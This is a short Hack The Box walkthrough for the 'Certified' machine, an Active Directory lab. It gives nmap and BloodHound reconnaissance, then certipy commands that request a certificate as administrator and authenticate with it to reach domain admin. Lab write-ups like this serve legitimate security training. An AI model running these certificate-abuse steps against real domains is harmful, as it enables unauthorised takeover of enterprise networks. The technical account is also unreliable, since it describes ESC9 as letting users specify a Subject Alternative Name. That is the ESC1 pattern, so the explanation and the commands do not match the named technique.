# HTB — Certified

> **Platform:** Hack The Box  
> **Difficulty:** Medium  
> **Tags:** Active Directory, ADCS, ESC9  
> **Date:** 2025-01

---

## Summary

Certified is an Active Directory-focused machine that involves exploiting Active Directory Certificate Services (ADCS) using the ESC9 vulnerability to escalate privileges and obtain domain admin access.

---

## Reconnaissance

```bash
nmap -sCV -p- 10.10.11.XXX
```

Standard AD ports open: 53, 88, 135, 139, 389, 445, 636, etc.

### BloodHound Enumeration

```bash
bloodhound-python -u 'user' -p 'password' -d certified.htb -ns 10.10.11.XXX -c all
```

BloodHound reveals a path from our initial user to a group with enrollment rights on a vulnerable certificate template.

---

## Exploitation

### ADCS — ESC9

The certificate template allows low-privileged users to specify a Subject Alternative Name (SAN), and the `CT_FLAG_NO_SECURITY_EXTENSION` flag is set:

```bash
certipy find -u user@certified.htb -p 'password' -dc-ip 10.10.11.XXX
certipy req -u user@certified.htb -p 'password' -ca 'certified-CA' \
  -template 'CertifiedTemplate' -upn administrator@certified.htb
```

Using the certificate to authenticate as Administrator:

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.XXX
```

**Domain Admin achieved.**

---

## Lessons Learned

- ADCS misconfigurations are increasingly common in enterprise environments
- ESC9 is a relatively new attack vector — keep tooling updated
- Always enumerate certificate templates during AD assessments
